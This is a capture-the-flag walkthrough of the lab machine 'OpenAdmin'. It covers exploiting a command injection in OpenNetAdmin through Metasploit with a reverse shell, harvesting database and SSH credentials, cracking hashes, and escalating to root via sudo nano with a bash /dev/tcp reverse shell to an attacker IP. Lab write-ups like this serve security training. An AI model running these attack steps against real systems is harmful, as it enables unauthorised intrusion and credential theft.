# OpenAdmin

## SYN Scan
```
nmap -sS -sV -O -p- -v -T4 -oA nmap/full_syn 10.10.10.171

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## SOLMUSIC
`/music`
![solmusic](./screenshots/solmusic.png)

## ARCWORK
`artwork`
![arcwork](./screenshots/arcwork.png)

## SIERRA
`sierra`
![sierra](./screenshots/sierra.png)

## OpenNetAdmin
**OpenNetAdmin** provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. A full **CLI interface** is available as well to use for **scripting** and bulk work.

`/ona`
![ona](./screenshots/opennetadmin.png)

```
You are NOT on the latest release version
Your version    = v18.1.1
Latest version = Unable to determine
```

## OpenNetAdmin Login
`/ova/login.php`
Used `admin:admin` credentails to log in to OpenNetAdmin.

## RCE via OpenNetAdmin Ping Command Injection
This module exploits a command injection in `OpenNetAdmin` between `8.5.14` and `18.1.1`.

https://www.rapid7.com/db/modules/exploit/unix/webapp/opennetadmin_ping_cmd_injection/

https://www.exploit-db.com/exploits/47772

### Exploitation
```
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set rhosts 10.10.10.171
rhosts => 10.10.10.171
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set lhost tun0
lhost => ***
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set payload linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp
```

```
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > exploit

[*] Started reverse TCP handler on 10.10.14.33:4444 
[*] Exploiting...
[*] Command shell session 1 opened (10.10.14.33:4444 -> 10.10.10.171:33442) at 2021-04-06 23:20:49 +0300
```

```
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > sessions -i 1
[*] Starting interaction with 1...

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Local User Enumeration
```
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
```

## Directory Enumeration
```
(remote) www-data@openadmin:/var/www$ ls -l
total 8
drwxr-xr-x 6 www-data www-data 4096 Nov 22  2019 html
drwxrwx--- 2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx 1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
```

```
(remote) www-data@openadmin:/var/www/html$ ls -l
total 28
drwxrwxr-x 7 www-data www-data  4096 Nov 22  2019 artwork
-rw-r--r-- 1 www-data www-data 10918 Nov 21  2019 index.html
drwxrwxr-x 8 www-data www-data  4096 Nov 22  2019 marga
drwxrwxr-x 8 www-data www-data  4096 Nov 22  2019 music
lrwxrwxrwx 1 www-data www-data    12 Nov 21  2019 ona -> /opt/ona/www
drwxrwxr-x 8 www-data www-data  4096 Nov 22  2019 sierra
```

```
(remote) www-data@openadmin:/opt$ ls -l
total 4
drwxr-x--- 7 www-data www-data 4096 Nov 21  2019 ona
-rw-r--r-- 1 root     root        0 Nov 22  2019 priv
```

```
(remote) www-data@openadmin:/opt/ona$ ls -l
total 28
-rw-rw-r--  1 www-data www-data 2159 Jan  3  2018 README.md
-rw-rw-r--  1 www-data www-data    8 Jan  3  2018 VERSION
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 bin
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 docs
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 etc
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 sql
drwxrwxr-x 10 www-data www-data 4096 Nov 22  2019 www
```

## LDAP Password
```
(remote) www-data@openadmin:/var/www/ona$ cat config/auth_ldap.config.php
...
//$conf['auth']['ldap']['bindpw']   = 'mysecretbindpassword';
...
```

## Local MySQL Service
```
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
```

### MySQL LinPEAS Scan
```
[+] MySQL version
mysql  Ver 14.14 Distrib 5.7.28, for Linux (x86_64) using  EditLine wrapper

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/
```

## MySQL Database Credentials
`/opt/ona/www/local/config/database_settings.inc.php`

```
...
'db_type' => 'mysqli',
'db_host' => 'localhost',
'db_login' => 'ona_sys',
'db_passwd' => 'n1nj4W4rri0R!',
...
```

## OpenNetAdmin Credentials in MySQL
```
mysql> use ona_default;
```

```
mysql> select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2021-04-06 21:32:08 | 2021-04-06 21:32:08 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2021-04-06 21:22:17 | 2021-04-06 21:22:17 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
```

```
21232f297a57a5a743894a0e4a801fc3:admin           
098f6bcd4621d373cade4e832627b4f6:test
```

## Local Privilege Escalation (jimmy)
Used the password of the `OpenNetAdmin's MySQL` user to log in as the user `jimmy`.
```
jimmy: n1nj4W4rri0R!
```

```
jimmy@openadmin:/opt$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

## Internal OpenAdmin Web Application
```
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN
```

```
(remote) www-data@openadmin:/var/www/ona$ nc 127.0.0.1 52846
sdf
HTTP/1.1 400 Bad Request
Date: Tue, 06 Apr 2021 20:40:31 GMT
Server: Apache/2.4.29 (Ubuntu)
...
<address>Apache/2.4.29 (Ubuntu) Server at internal.openadmin.htb Port 80</address>
...
```

## SSH RSA Private Key Disclosure
```
jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

## SHA512 Disclosure in The Source Code of The Internal Web Application
```
jimmy@openadmin:/var/www/internal$ cat index.php
...
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
...
```

### Cracked The SHA512 Using Hashcat Wordlist Attack
Used rockyou.txt and best64 rule to crack the SHA512.

```
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1:Revealed
```

## Port Forwarding via SSH
```
ssh -l jimmy 10.10.10.171 -L 0.0.0.0:8088:127.0.0.1:52846
```

```
$ netstat -tulpn | grep 8088
tcp        0      0 0.0.0.0:8088            0.0.0.0:*               LISTEN      57945/ssh
```

## Internal Web Application
![internal_web_app](./screenshots/internal_web_app.png)

## Joanna's Encrypted SSH RSA Private Key
![joanna_id_rsa](./screenshots/joanna_id_rsa.png)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
....
```

### Cracked The Password of The SSH RSA Private Key by Using JohnTheRipper
```
bloodninjas      (ssh/joanna_id_rsa)
```

## Local Privilege Escalation (joanna)
Used joanna's SSH RSA private key to log in.

```
The Password of The Key: bloodninjas
```

```
ssh -l joanna 10.10.10.171 -i ssh/joanna_id_rsa
```

```
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

## The User Flag
```
joanna@openadmin:~$ ls -l /home/joanna/
total 4
-rw-rw-r-- 1 joanna joanna 33 Nov 28  2019 user.txt
```

```
c9b2cf07d40807e62af62660f0c81b5f
```

## NOPASSWD Nano Executable
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

## Local Privilege Escalation (root)
Executed `/bin/nano /opt/priv` which does not require a password as `root` user based on the `sudoers` rule.

Pressed `^R^X` to open up the command execution prompt in `nano`.

```
Command to execute: /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.33/6666 0>&1"
```

```
root@openadmin:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## The Root Flag
```
2f907ed450b361b2c2bf4e8795d5b561
```
